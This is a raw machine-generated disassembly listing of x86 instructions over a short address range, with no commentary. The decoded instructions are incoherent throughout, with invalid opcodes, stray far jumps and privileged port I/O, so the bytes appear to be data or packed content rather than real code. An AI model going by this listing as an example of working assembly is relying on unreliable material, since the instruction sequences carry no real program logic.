  41f1ee:	fsubr  DWORD PTR [esi+0x2c]
  41f1f1:	sub    al,0xdf
  41f1f3:	pop    ebx
  41f1f4:	loope  0x41f211
  41f1f6:	retf   
  41f1f7:	scas   al,BYTE PTR es:[edi]
  41f1f8:	retf   
  41f1f9:	stos   BYTE PTR es:[edi],al
  41f1fa:	or     ebx,DWORD PTR ds:0xf369a1b0
  41f200:	mov    ah,0x5a
  41f202:	sub    al,0x31
  41f204:	sbb    al,0x74
  41f206:	test   eax,0x969880ed
  41f20b:	add    edi,DWORD PTR [edi]
  41f20d:	adc    al,0x6b
  41f20f:	pop    ds
  41f210:	mov    bh,0xcb
  41f212:	jmp    DWORD PTR [ebp-0x5f]
  41f215:	retf   
  41f216:	jg     0x41f241
  41f218:	mov    dh,0x4b
  41f21a:	add    BYTE PTR [edx+0x47],dl
  41f21d:	add    BYTE PTR [edi-0x5fa4ffbd],bh
  41f223:	ins    DWORD PTR es:[edi],dx
  41f224:	loope  0x41f1d8
  41f226:	ins    BYTE PTR es:[edi],dx
  41f227:	mov    edi,0x6f4da944
  41f22c:	mov    ch,0x6b
  41f22e:	xchg   ebp,eax
  41f22f:	ret    0x2cb2
  41f232:	or     edi,DWORD PTR [edi-0x65]
  41f235:	jg     0x41f1c3
  41f237:	push   0x4b2cb291
  41f23c:	in     eax,dx
  41f23d:	test   DWORD PTR [ebx-0x6b],esi
  41f240:	mov    bl,0x7e
  41f242:	call   0x93ed:0xb7cb0a77
  41f249:	lahf   
  41f24a:	adc    al,0x9b
  41f24c:	sbb    dl,BYTE PTR [edi-0x506c9f00]
  41f252:	jg     0x41f228
  41f254:	pop    edx
  41f255:	mov    BYTE PTR [esi],dl
  41f257:	jns    0x41f217
  41f259:	and    ah,BYTE PTR [ebx-0x347af4f9]
  41f25f:	mov    dh,0xcb
  41f261:	push   esp
  41f262:	pop    edi
  41f263:	mov    al,0x5d
  41f265:	mov    bl,0x16
  41f267:	jbe    0x41f28f
  41f269:	ins    BYTE PTR es:[edi],dx
  41f26a:	mov    ah,0x8d
  41f26c:	pop    ebx
  41f26d:	ins    DWORD PTR es:[edi],dx
  41f26e:	ret    0xc9c7
  41f271:	ret    
  41f272:	(bad)  
  41f273:	cdq    
  41f274:	xor    BYTE PTR [ebx-0x5b],bl
  41f277:	or     ebp,DWORD PTR [edi+edi*8-0x2c]
  41f27b:	xchg   DWORD PTR [ecx],edi
  41f27d:	rcl    DWORD PTR [edi+ecx*2],cl
  41f280:	add    cl,bl
  41f282:	mov    dl,0x6c
  41f284:	or     esi,DWORD PTR [ebx-0x28]
  41f287:	mov    edi,0xf81cef0b
  41f28c:	sub    al,0xcb
  41f28e:	mov    dl,0x2c
  41f290:	adc    eax,0xdc0aeef1
  41f295:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f297:	retf   
  41f298:	mov    dl,0x78
  41f29a:	lds    esp,FWORD PTR [ecx-0x5a]
  41f29d:	xor    ah,BYTE PTR [edx+0x659e6a00]
  41f2a3:	pop    ecx
  41f2a4:	xchg   esi,eax
  41f2a5:	lods   eax,DWORD PTR ds:[esi]
  41f2a6:	dec    edi
  41f2a7:	push   ebx
  41f2a8:	clc    
  41f2a9:	pop    esp
  41f2aa:	loope  0x41f286
  41f2ac:	push   0xea45970b
  41f2b1:	and    ch,0xfe
  41f2b4:	xchg   ah,ah
  41f2b6:	aaa    
  41f2b7:	lds    esi,FWORD PTR [esi-0x57]
  41f2ba:	pop    ebp
  41f2bb:	clc    
  41f2bc:	xchg   esp,eax
  41f2bd:	repnz pop esp
  41f2bf:	sti    
  41f2c0:	(bad)  
  41f2c1:	jmp    0x76d0:0xb2cbe6d1
  41f2c8:	push   esp
  41f2c9:	and    bl,dh
  41f2cb:	sar    DWORD PTR [edi+0x1b],1
  41f2ce:	mov    al,0x14
  41f2d0:	sub    al,0xcb
  41f2d2:	mov    dl,0x2c
  41f2d4:	test   eax,0x5b06a20d
  41f2d9:	mov    dl,0x2c
  41f2db:	retf   
  41f2dc:	mov    dl,0xff
  41f2de:	dec    esp
  41f2df:	call   0x4bcfe439
  41f2e4:	or     ecx,ebx
  41f2e6:	pop    esi
  41f2e7:	cli    
  41f2e8:	jmp    0x41f31f
  41f2ea:	mov    DWORD PTR [esi],esi
  41f2ec:	push   esi
  41f2ed:	cmp    al,0xe3
  41f2ef:	inc    edx
  41f2f0:	stc    
  41f2f1:	repnz dec ecx
  41f2f3:	add    BYTE PTR [esi],bh
  41f2f5:	xchg   esi,eax
  41f2f6:	push   ebx
  41f2f7:	add    BYTE PTR [esi],ah
  41f2f9:	mov    edx,0x3fea2e64
  41f2fe:	das    
  41f2ff:	pop    edi
  41f300:	mov    esi,0x5600277c
  41f305:	into   
  41f306:	sub    al,0x0
  41f308:	pop    esi
  41f309:	(bad)  
  41f30a:	xor    eax,0x32d24600
  41f30f:	add    BYTE PTR [esi+0xa],cl
  41f312:	lods   eax,DWORD PTR ds:[esi]
  41f313:	add    al,0x95
  41f315:	rcl    BYTE PTR [ebx-0x49125195],cl
  41f31b:	mov    al,0x35
  41f31d:	test   al,0xfe
  41f31f:	lahf   
  41f320:	add    al,0x6c
  41f322:	sahf   
  41f323:	nop
  41f324:	aas    
  41f325:	add    eax,0xb0b0b6c
  41f32a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f32c:	xor    al,0x9e
  41f32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f32f:	(bad)  
  41f330:	clc    
  41f331:	cwde   
  41f332:	lods   eax,DWORD PTR ds:[esi]
  41f333:	test   DWORD PTR [edi],ebp
  41f335:	cs cs jnp 0x41f3b0
  41f339:	ins    BYTE PTR es:[edi],dx
  41f33a:	cmp    dh,BYTE PTR [ecx]
  41f33c:	cdq    
  41f33d:	jl     0x41f35a
  41f33f:	sbb    ebp,ebp
  41f341:	repnz push ss
  41f343:	pop    esp
  41f344:	add    BYTE PTR [edx-0x276dc3e1],ah
  41f34a:	push   ecx
  41f34b:	cmp    DWORD PTR [esi+ebx*8+0x511005f8],esi
  41f352:	pushf  
  41f353:	and    ecx,DWORD PTR [ecx]
  41f355:	daa    
  41f356:	add    dh,al
  41f358:	cs adc eax,0xb0585f96
  41f35e:	add    bh,cl
  41f360:	lods   eax,DWORD PTR ds:[esi]
  41f361:	test   al,0x13
  41f363:	push   ebx
  41f364:	fs jbe 0x41f31b
  41f367:	ins    DWORD PTR es:[edi],dx
  41f368:	mov    ebx,0x5d5c62d4
  41f36d:	fwait
  41f36e:	loopne 0x41f310
  41f370:	jp     0x41f3b4
  41f372:	bound  esi,QWORD PTR [ebp-0x1b92d250]
  41f378:	dec    edi
  41f379:	mov    edi,0x284020fc
  41f37e:	add    dl,BYTE PTR ds:0xd0b6c6db
  41f384:	and    al,0x50
  41f386:	push   cs
  41f387:	jnp    0x41f33b
  41f389:	sahf   
  41f38a:	repnz fcmovnu st,st(2)
  41f38d:	ins    DWORD PTR es:[edi],dx
  41f38e:	stos   DWORD PTR es:[edi],eax
  41f38f:	xor    ebx,ecx
  41f391:	pusha  
  41f392:	push   ebx
  41f393:	loop   0x41f33b
  41f395:	add    bl,BYTE PTR [esp+eiz*4+0x62]
  41f399:	push   ss
  41f39a:	mov    dh,0x6d
  41f39c:	imul   edx,DWORD PTR [edx+0x28],0xffffffad
  41f3a0:	into   
  41f3a1:	shl    BYTE PTR [eax],cl
  41f3a3:	ret    0xca10
  41f3a6:	gs push 0xb862db6b
  41f3ac:	es dec ebp
  41f3ae:	sub    eax,ecx
  41f3b0:	mov    al,0xba
  41f3b2:	sub    al,0xff
  41f3b4:	mov    dl,0xdf
  41f3b6:	mov    eax,0xd700183f
  41f3bb:	sahf   
  41f3bc:	add    BYTE PTR [edx-0x3bd7de57],ch
  41f3c2:	(bad)  
  41f3c3:	inc    ecx
  41f3c4:	lahf   
  41f3c5:	setp   BYTE PTR [ecx]
  41f3c8:	xchg   edi,eax
  41f3c9:	loop   0x41f36f
  41f3cb:	xor    al,BYTE PTR ss:[ecx]
  41f3ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3cf:	mov    dh,0x67
  41f3d1:	jmp    0x10d9af20
  41f3d6:	retf   
  41f3d7:	add    bh,BYTE PTR [ebx]
  41f3d9:	sbb    edi,esi
  41f3db:	outs   dx,BYTE PTR ds:[esi]
  41f3dc:	inc    ebp
  41f3dd:	test   DWORD PTR [edi+0x5b],esi
  41f3e0:	mov    edx,0x374035b0
  41f3e5:	je     0x41f3d2
  41f3e7:	add    al,0xef
  41f3e9:	inc    ebp
  41f3ea:	jecxz  0x41f3bf
  41f3ec:	ds pop ebx
  41f3ee:	pop    ebx
  41f3ef:	jmp    0x41f433
  41f3f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3f2:	fcmovnu st,st(0)
  41f3f4:	jbe    0x41f413
  41f3f6:	ret    
  41f3f7:	and    al,bh
  41f3f9:	fcomp  st(2)
  41f3fb:	lods   eax,DWORD PTR ds:[esi]
  41f3fc:	scas   eax,DWORD PTR es:[edi]
  41f3fd:	pop    eax
  41f3fe:	pop    ds
  41f3ff:	stc    
  41f400:	mov    ebx,0xbf62c086
  41f405:	lea    esi,[ecx-0x4da481ac]
  41f40b:	mov    esi,edi
  41f40d:	xchg   ebp,eax
  41f40e:	test   eax,0x5f349100
  41f413:	(bad)  [ebp-0x3c4f4493]
  41f419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f41a:	adc    BYTE PTR [ecx+0x6e978f02],ah
  41f420:	sbb    esp,DWORD PTR [ebx+0x56]
  41f423:	mov    edx,0xf1566db5
  41f428:	adc    DWORD PTR [esi+0x5c106113],edi
  41f42e:	sahf   
  41f42f:	mov    eax,ds:0xc7dbb52d
  41f434:	add    eax,0x8c2f2a7b
  41f439:	mov    ch,0x53
  41f43b:	jmp    0x40f2018b
  41f440:	out    0x9b,eax
  41f442:	or     BYTE PTR fs:[ecx-0x64e548c4],0x8a
  41f44a:	in     al,dx
  41f44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f44c:	push   eax
  41f44d:	hlt    
  41f44e:	xchg   DWORD PTR [ebp-0x49c803d8],esi
  41f454:	xchg   esi,eax
  41f455:	or     dl,BYTE PTR [ebp-0x5c]
  41f458:	mov    esp,0xd693d137
  41f45d:	data16 jo 0x41f401
  41f460:	sub    eax,0xf40d416c
  41f465:	mov    eax,ds:0x7512973b
  41f46a:	gs stc 
  41f46c:	inc    esi
  41f46d:	inc    ebx
  41f46e:	ja     0x41f464
  41f470:	xchg   ebx,eax
  41f471:	cmp    dh,BYTE PTR [edi+0x0]
  41f474:	int    0xec
  41f476:	arpl   WORD PTR [ebx-0x6a],bx
  41f479:	(bad)  
  41f47a:	(bad)  
  41f47b:	stos   DWORD PTR es:[edi],eax
  41f47c:	xor    al,0xdf
  41f47e:	cmp    eax,0xcb93e708
  41f483:	(bad)  
  41f484:	mov    dl,0x7c
  41f486:	call   0x1851f522
  41f48b:	sbb    DWORD PTR [ebx+0x68d902d0],ebp
  41f491:	xor    BYTE PTR [esi+0x7e838c87],0xe2
  41f498:	xchg   ebx,eax
  41f499:	ds pop ecx
  41f49b:	xchg   esi,eax
  41f49c:	lea    esp,[ebp-0x15]
  41f49f:	or     ch,BYTE PTR [ebx-0x540ad304]
  41f4a5:	mov    eax,0x9323637c
  41f4aa:	mov    ss,edx
  41f4ac:	add    BYTE PTR [edi+0x58],ah
  41f4af:	fbstp  TBYTE PTR [edi+0x42cb6c0f]
  41f4b5:	xor    ebx,ecx
  41f4b7:	mov    edx,0x6eaa3fc3
  41f4bd:	ins    DWORD PTR es:[edi],dx
  41f4be:	ins    BYTE PTR es:[edi],dx
  41f4bf:	sub    eax,0x5da31977
  41f4c4:	jb     0x41f4dc
  41f4c6:	ins    BYTE PTR es:[edi],dx
  41f4c7:	lds    ebp,FWORD PTR [esi+0x6d]
  41f4ca:	mov    al,0xd5
  41f4cc:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41f4ce:	out    dx,al
  41f4cf:	in     al,dx
  41f4d0:	rcl    al,0x17
  41f4d3:	in     eax,0x51
  41f4d5:	mov    edx,0xe9c036d5
  41f4da:	pop    edi
  41f4db:	cs xor ah,cl
  41f4de:	xchg   BYTE PTR [ebp+0xb6c2db],ah
  41f4e4:	push   edi
  41f4e5:	or     esp,DWORD PTR ds:0xd53c1724
  41f4ec:	xchg   BYTE PTR ds:0xd9fe56db,ch
  41f4f2:	add    BYTE PTR ds:0xe26d00de,dh
  41f4f8:	mov    edi,0xd22410f
  41f4fd:	das    
  41f4fe:	pop    edi
  41f4ff:	mov    edx,0x495b7db0
  41f504:	in     eax,0x5e
  41f506:	xlat   BYTE PTR ds:[ebx]
  41f507:	mov    esi,0xa58e0f00
  41f50c:	add    BYTE PTR [ebp-0x5e],cl
  41f50f:	mov    ah,0x83
  41f511:	xchg   esi,eax
  41f512:	test   eax,0x95605bad
  41f517:	pop    ecx
  41f518:	or     dh,BYTE PTR [edi+0x69f9ddad]
  41f51e:	popf   
  41f51f:	ror    DWORD PTR [ebx],1
  41f521:	jb     0x41f546
  41f523:	push   eax
  41f524:	mov    DWORD PTR [ebx],edx
  41f526:	push   ss
  41f527:	xchg   esi,eax
  41f528:	das    
  41f529:	frstor [eax]
  41f52b:	aas    
  41f52c:	dec    edx
  41f52d:	push   eax
  41f52e:	jne    0x41f530
  41f530:	std    
  41f531:	jns    0x41f5b0
  41f533:	mov    BYTE PTR [ecx+0x47],ah
  41f536:	or     esi,DWORD PTR ds:0x3f654916
  41f53c:	stos   BYTE PTR es:[edi],al
  41f53d:	xchg   edi,eax
  41f53e:	inc    eax
  41f53f:	loope  0x41f547
  41f541:	pop    ebp
  41f542:	inc    eax
  41f543:	push   ecx
  41f544:	mov    ds:0x5dde4781,al
  41f549:	cs jecxz 0x41f512
  41f54c:	ret    0x3946
  41f54f:	(bad)  
  41f550:	mov    ss,WORD PTR [ebx+0x3f4dc8a8]
  41f556:	in     eax,dx
  41f557:	push   esi
  41f558:	mov    ebx,0x35b1f144
  41f55d:	pop    edi
  41f55e:	test   DWORD PTR [edx-0x483561c3],edi
  41f564:	push   ss
  41f565:	mov    dh,0x21
  41f567:	lods   eax,DWORD PTR ds:[esi]
  41f568:	and    eax,0x2d7c29bb
  41f56d:	add    al,dh
  41f56f:	adc    eax,ebx
  41f571:	fiadd  DWORD PTR [ecx]
  41f573:	mov    bh,0xb5
  41f575:	leave  
  41f576:	sbb    DWORD PTR [edx+0x57c01c2],ecx
  41f57c:	aam    0xb6
  41f57e:	mov    al,0x55
  41f580:	mov    eax,0xd44380d3
  41f585:	retf   
  41f586:	jns    0x41f53a
  41f588:	sub    eax,0x2d4ebb5b
  41f58d:	stc    
  41f58e:	jno    0x41f54f
  41f590:	es imul ecx,ebx,0x3f
  41f594:	retf   
  41f595:	mov    dl,0x2c
  41f597:	fstp   TBYTE PTR [edi+edi*4+0x8]
  41f59b:	inc    ebp
  41f59c:	xor    DWORD PTR [esi+0x4f],ecx
  41f59f:	ins    DWORD PTR es:[edi],dx
  41f5a0:	pop    ss
  41f5a1:	push   0x24af52a8
  41f5a6:	push   edi
  41f5a7:	pop    ecx
  41f5a8:	into   
  41f5a9:	stos   BYTE PTR es:[edi],al
  41f5aa:	es mov dh,0x85
  41f5ad:	ins    DWORD PTR es:[edi],dx
  41f5ae:	mov    eax,ds:0xb3c1d9c5
  41f5b3:	or     eax,0x15c209d3
  41f5b8:	fmul   st,st(2)
  41f5ba:	push   ss
  41f5bb:	xchg   edi,eax
  41f5bc:	inc    edi
  41f5bd:	adc    DWORD PTR [edi+0x2505c327],esi
  41f5c3:	mov    dh,0xad
  41f5c5:	mov    ah,0x5d
  41f5c7:	scas   eax,DWORD PTR es:[edi]
  41f5c8:	and    DWORD PTR [edx+ecx*2+0x39d471e8],edi
  41f5cf:	out    dx,eax
  41f5d0:	cwde   
  41f5d1:	push   eax
  41f5d2:	mov    esi,0x3d4e376d
  41f5d7:	dec    BYTE PTR [eax]
  41f5d9:	push   ebx
  41f5da:	je     0x41f5df
  41f5dc:	add    BYTE PTR [eax+ebx*2-0x2b],dh
  41f5e0:	cs retf 
  41f5e2:	mov    dl,0x7f
  41f5e4:	fist   WORD PTR [ebx+0x418394c8]
  41f5ea:	mov    ah,0xed
  41f5ec:	shl    BYTE PTR [edx-0x4c0552ed],cl
  41f5f2:	push   esp
  41f5f3:	mov    bl,0xd7
  41f5f5:	nop
  41f5f6:	lods   eax,DWORD PTR gs:[esi]
  41f5f8:	mov    cl,0xa9
  41f5fa:	outs   dx,BYTE PTR ds:[esi]
  41f5fb:	inc    edx
  41f5fc:	mov    bh,0x63
  41f5fe:	pop    ss
  41f5ff:	out    0x7,al
  41f601:	test   al,0x2f
  41f603:	or     eax,0x9fb63636
  41f608:	add    cl,ch
  41f60a:	data16 mov BYTE PTR [edi+0x713c954d],bl
  41f611:	fcmovnu st,st(2)
  41f613:	dec    ecx
  41f614:	das    
  41f615:	mov    DWORD PTR [eax],ecx
  41f617:	inc    ecx
  41f618:	mov    esp,0x7585217d
  41f61d:	sub    eax,0x5a6c6e15
  41f622:	jno    0x41f669
  41f624:	ins    DWORD PTR es:[edi],dx
  41f625:	aaa    
  41f626:	sub    BYTE PTR [esi+0x65],ch
  41f629:	gs jecxz 0x41f602
  41f62c:	cmp    esp,DWORD PTR cs:[ecx-0x10]
  41f630:	xlat   BYTE PTR ds:[ebx]
  41f631:	fwait
  41f632:	test   al,0x92
  41f634:	imul   eax,edx,0x8d955cdc
  41f63a:	out    dx,al
  41f63b:	jne    0x41f618
  41f63d:	sahf   
  41f63e:	mov    al,gs:0xda068da1
  41f644:	add    DWORD PTR [edi+0x3b141276],ecx
  41f64a:	stc    
  41f64b:	retf   
  41f64c:	xchg   edi,eax
  41f64d:	mov    DWORD PTR gs:[edi+ebx*8+0x342dac24],eax
  41f655:	add    ch,dl
  41f657:	push   esi
  41f658:	sub    al,0xcb
  41f65a:	mov    dl,0x2c
  41f65c:	(bad)  
  41f65d:	pop    edi
  41f65e:	inc    ebp
  41f65f:	dec    eax
  41f660:	dec    edi
  41f661:	xchg   esi,eax
  41f662:	gs pop ecx
  41f664:	mov    esi,0x70001841
  41f669:	jp     0x41f6e5
  41f66b:	jae    0x41f6cc
  41f66d:	pop    edi
  41f66e:	mov    eax,0x516c597c
  41f673:	add    BYTE PTR [eax],al
  41f675:	gs stos BYTE PTR es:[edi],al
  41f677:	clc    
  41f678:	jbe    0x41f66e
  41f67a:	add    BYTE PTR [eax+esi*8+0x28db63ad],bl
  41f681:	lea    ecx,[ebp+ebx*8-0x3d1f6670]
  41f688:	repnz (bad) 
  41f68a:	ret    0xbff2
  41f68d:	add    BYTE PTR [eax-0x50],dh
  41f690:	mov    ch,0x2b
  41f692:	aas    
  41f693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f694:	scas   al,BYTE PTR es:[edi]
  41f695:	add    BYTE PTR [ecx+0x5f],ah
  41f698:	mov    esi,0x27bfcb2c
  41f69d:	enter  0xdb40,0x0
  41f6a1:	mov    cl,0x61
  41f6a3:	rol    DWORD PTR [eax],cl
  41f6a5:	mov    edx,0x2cb2cb2c
  41f6aa:	jp     0x41f651
  41f6ac:	imul   esp,DWORD PTR [eax-0x1f20d098],0xffffffb2
  41f6b3:	cdq    
  41f6b4:	pop    ds
  41f6b5:	repz add dh,bh
  41f6b8:	add    BYTE PTR [eax-0x61ffc01d],dl
  41f6be:	lods   eax,DWORD PTR ds:[esi]
  41f6bf:	(bad)  [edx-0x2ae2446b]
  41f6c5:	sub    WORD PTR [esi-0x268eddb5],sp
  41f6cc:	mov    dh,0xf2
  41f6ce:	xlat   BYTE PTR ds:[ebx]
  41f6cf:	add    BYTE PTR [esi],ah
  41f6d1:	xchg   ebx,eax
  41f6d2:	inc    ecx
  41f6d3:	das    
  41f6d4:	lds    esi,FWORD PTR [ebp+edi*4-0x1d]
  41f6d8:	ins    BYTE PTR es:[edi],dx
  41f6d9:	retf   
  41f6da:	push   esi
  41f6db:	mov    esi,0xb600ef1b
  41f6e0:	jmp    0x41f717
  41f6e2:	mov    ds:0x81a4415f,eax
  41f6e7:	lods   eax,DWORD PTR ds:[esi]
  41f6e8:	mov    ds:0xb8677b6e,eax
  41f6ed:	int3   
  41f6ee:	ds mov esp,esi
  41f6f1:	sbb    DWORD PTR [ebx-0x42],0x5f0376c0
  41f6f8:	es inc ebx
  41f6fa:	sub    dl,dh
  41f6fc:	add    BYTE PTR [ebp-0x2f],bh
  41f6ff:	js     0x41f70f
  41f701:	fsubr  DWORD PTR [eax]
  41f703:	push   esp
  41f704:	arpl   WORD PTR [edx+ecx*4+0x6bd1398e],bp
  41f70b:	retf   
  41f70c:	aaa    
  41f70d:	call   0x7f685d30
  41f712:	add    BYTE PTR [edx],cl
  41f714:	outs   dx,DWORD PTR ds:[esi]
  41f715:	pop    es
  41f716:	pop    ecx
  41f717:	pop    edi
  41f718:	mov    esi,0xd274a17c
  41f71d:	inc    edi
  41f71e:	pop    ecx
  41f71f:	jg     0x41f6fc
  41f721:	lea    eax,[eax]
  41f723:	sub    ah,al
  41f725:	xchg   BYTE PTR [eax],al
  41f727:	and    ebx,ebx
  41f729:	test   DWORD PTR [ebp+0x59],ebp
  41f72c:	int    0x1e
  41f72e:	add    bh,al
  41f730:	retf   0x73c9
  41f733:	or     ecx,DWORD PTR [ebp+0x4b2da376]
  41f739:	push   ebx
  41f73a:	push   0xc6602c96
  41f73f:	out    0xef,al
  41f741:	sub    al,0x6c
  41f743:	mov    bh,0xc2
  41f745:	push   ds
  41f746:	mov    ebx,0xfe1755ec
  41f74b:	bnd jg 0x41f75a
  41f74e:	or     eax,0xd2b28dd0
  41f753:	sub    eax,0xa1e36c59
  41f758:	pop    ecx
  41f759:	push   ss
  41f75a:	mov    dh,0x1b
  41f75c:	jle    0x41f78b
  41f75e:	sub    eax,DWORD PTR [esi+0x72307f10]
  41f764:	fcmovnbe st,st(6)
  41f766:	xchg   esi,eax
  41f767:	cmp    DWORD PTR gs:[ebx-0x6ee5283a],ecx
  41f76e:	ret    0xdde6
  41f771:	xchg   esi,eax
  41f772:	outs   dx,DWORD PTR ds:[esi]
  41f773:	or     ecx,DWORD PTR [edx]
  41f775:	push   edx
  41f776:	stos   BYTE PTR es:[edi],al
  41f777:	xchg   esp,eax
  41f778:	fild   DWORD PTR [eax]
  41f77a:	pop    ebx
  41f77b:	test   BYTE PTR [esp+ebp*2-0x3f],dh
  41f77f:	in     eax,0xdb
  41f781:	ins    DWORD PTR es:[edi],dx
  41f782:	stos   DWORD PTR es:[edi],eax
  41f783:	jp     0x41f7a1
  41f785:	cmp    eax,0xd7269b2c
  41f78a:	fld    QWORD PTR [eax]
  41f78c:	push   ebp
  41f78d:	call   0xfd17:0x6db4d6a5
  41f794:	jp     0x41f7e6
  41f796:	push   0xb67450ab
  41f79b:	jne    0x41f7dd
  41f79d:	mov    bh,0xff
  41f79f:	das    
  41f7a0:	inc    edx
  41f7a1:	mov    al,0xa0
  41f7a3:	dec    ebx
  41f7a4:	mov    ecx,esp
  41f7a6:	pop    ss
  41f7a7:	mov    dl,0xb0
  41f7a9:	ins    BYTE PTR es:[edi],dx
  41f7aa:	fstp   TBYTE PTR [edx+eax*1+0x39]
  41f7ae:	cmc    
  41f7af:	jne    0x41f77d
  41f7b1:	sub    ebp,DWORD PTR [esi-0x48]
  41f7b4:	sub    eax,0x60d3cb6c
  41f7b9:	or     bl,ch
  41f7bb:	fstp   DWORD PTR [edx+0x5b6b16c8]
  41f7c1:	sub    ch,BYTE PTR [edi+ebx*8]
  41f7c4:	cmp    DWORD PTR [edi+0x0],ebp
  41f7c7:	sbb    eax,0xfe9d7673
  41f7cc:	adc    BYTE PTR [ecx],0xb8
  41f7cf:	mov    ch,0xa8
  41f7d1:	jbe    0x41f84f
  41f7d3:	add    ebx,DWORD PTR [esi+eax*8+0x17]
  41f7d7:	scas   eax,DWORD PTR es:[edi]
  41f7d8:	dec    edi
  41f7d9:	repnz in eax,0x1b
  41f7dc:	sbb    BYTE PTR [esp+ebx*2+0x5b570057],bl
  41f7e3:	pop    edi
  41f7e4:	add    BYTE PTR [eax+0x23],dl
  41f7e7:	ins    DWORD PTR es:[edi],dx
  41f7e8:	jmp    0x41f830
  41f7ea:	stc    
  41f7eb:	daa    
  41f7ec:	add    BYTE PTR [ecx],ch
  41f7ee:	sub    esi,DWORD PTR [esi]
  41f7f0:	and    dh,BYTE PTR [ebx]
  41f7f2:	dec    ebx
  41f7f3:	test   al,0xd1
  41f7f5:	mov    ebx,0xa4ad6eb5
  41f7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7fb:	mov    WORD PTR [edx-0xa],?
  41f7fe:	pop    es
  41f7ff:	pop    ecx
  41f800:	jns    0x41f7ff
  41f802:	push   0x51cdb696
  41f807:	mov    al,ds:0x6ad1fab0
  41f80c:	or     ecx,DWORD PTR [edi-0x24923bf0]
  41f812:	fst    QWORD PTR [ebx]
  41f814:	out    0xfe,al
  41f816:	sbb    dh,dl
  41f818:	(bad)  
  41f819:	(bad)  
  41f81a:	cs sub al,0x74
  41f81d:	mov    ebp,0xdcee52f6
  41f822:	jmp    0xdbb6:0xd629c870
  41f829:	(bad)  
  41f82a:	loop   0x41f84d
  41f82c:	sar    DWORD PTR [esi+edx*1-0x5533afc8],0x53
  41f834:	fcomp  DWORD PTR [edx+0x549db80]
  41f83a:	aaa    
  41f83b:	rcr    BYTE PTR [ecx],1
  41f83d:	inc    ebx
  41f83e:	mov    al,0x3b
  41f840:	fistp  DWORD PTR [eax+0x62]
  41f843:	fnsetpm(287 only) 
  41f845:	pop    edi
  41f846:	add    eax,0xb4e0432c
  41f84b:	(bad)
  41f84f:	jbe    0x41f8bc
  41f851:	in     al,dx
  41f852:	jae    0x41f838
  41f854:	mov    eax,0xb66b4a2f
  41f859:	fmul   DWORD PTR [ebp-0x71e9f1e5]
  41f85f:	aam    0x8c
  41f861:	in     eax,dx
  41f862:	in     eax,0x94
  41f864:	stos   DWORD PTR es:[edi],eax
  41f865:	in     eax,dx
  41f866:	mov    dh,0x50
  41f868:	xchg   esi,eax
  41f869:	jl     0x41f808
  41f86b:	mov    cs,WORD PTR [esi+0x749926a4]
  41f871:	jmp    0x41f813
  41f873:	lods   eax,DWORD PTR ds:[esi]
  41f874:	or     ebx,DWORD PTR [ebx+0x11]
  41f877:	or     bl,BYTE PTR [edi]
  41f879:	jle    0x41f8af
  41f87b:	add    eax,0x85b46d32
  41f880:	inc    edx
  41f881:	sahf   
  41f882:	sbb    DWORD PTR [edi+ebp*8+0x61],ecx
  41f886:	xor    eax,0x2c6db0b0
  41f88b:	mov    ecx,0x802d8431
  41f890:	and    al,0x82
  41f892:	and    eax,0x2d2db6c4
  41f897:	in     al,0x2e
  41f899:	into   
  41f89a:	ds dec ebp
  41f89c:	fstp   QWORD PTR [edi+ebx*4-0x7b]
  41f8a0:	gs pop ebx
  41f8a2:	push   0xbf80d0fe
  41f8a7:	fisttp QWORD PTR [ecx-0x72252584]
  41f8ad:	test   DWORD PTR [edi],ebp
  41f8af:	sbb    al,0xb2
  41f8b1:	scas   al,BYTE PTR es:[edi]
  41f8b2:	jo     0x41f8ed
  41f8b4:	or     ebx,DWORD PTR [esi+0x6d85da8d]
  41f8ba:	pop    ebx
  41f8bb:	add    dl,BYTE PTR [ecx-0x66192afb]
  41f8c1:	or     eax,0xd805dcbd
  41f8c6:	pop    eax
  41f8c7:	pop    eax
  41f8c8:	fisub  DWORD PTR [esi]
  41f8ca:	xchg   esi,eax
  41f8cb:	stos   BYTE PTR es:[edi],al
  41f8cc:	sub    cl,BYTE PTR [edi+0x54]
  41f8cf:	and    al,0xc7
  41f8d1:	fcmovnbe st,st(6)
  41f8d3:	inc    eax
  41f8d4:	fadd   QWORD PTR [edx+0x4d]
  41f8d7:	sti    
  41f8d8:	jmp    0x41f920
  41f8da:	repnz icebp 
  41f8dc:	out    0x60,al
  41f8de:	mov    ch,0xb1
  41f8e0:	ins    DWORD PTR es:[edi],dx
  41f8e1:	mov    ch,0xab
  41f8e3:	mov    ecx,0xba626907
  41f8e8:	push   DWORD PTR [edx+0x5b]
  41f8eb:	in     eax,dx
  41f8ec:	mov    dh,0xb1
  41f8ee:	and    eax,0xc57b18ad
  41f8f3:	xor    eax,DWORD PTR [esi-0x69e4bc35]
  41f8f9:	outs   dx,DWORD PTR ds:[esi]
  41f8fa:	ins    BYTE PTR es:[edi],dx
  41f8fb:	mov    ch,0x8f
  41f8fd:	push   0x16ffc201
  41f902:	sub    al,0x0
  41f904:	sbb    DWORD PTR [edi],0x59659659
  41f90a:	xchg   esi,eax
  41f90b:	sub    BYTE PTR [ecx+eiz*1-0x49249236],bl
  41f912:	ins    DWORD PTR es:[edi],dx
  41f913:	cmp    dl,BYTE PTR [edx-0x73ccd927]
  41f919:	lea    edx,[edi]
  41f91b:	test   DWORD PTR [edx],esi
  41f91d:	pop    ebx
  41f91e:	mov    ebx,0x9e1c8895
  41f923:	clc    
  41f924:	mov    cl,0x5c
  41f926:	pop    ecx
  41f927:	sbb    ch,BYTE PTR [esi]
  41f929:	push   es
  41f92a:	or     ecx,DWORD PTR [ebx+0x4b]
  41f92d:	pop    esp
  41f92e:	add    ebx,ebp
  41f930:	adc    al,0x22
  41f932:	cmp    ecx,DWORD PTR [edi-0x1c9c1226]
  41f938:	xor    al,0x32
  41f93a:	data16 jo 0x41f952
  41f93d:	adc    al,BYTE PTR ds:0x6d3b4a25
  41f943:	stc    
  41f944:	inc    esi
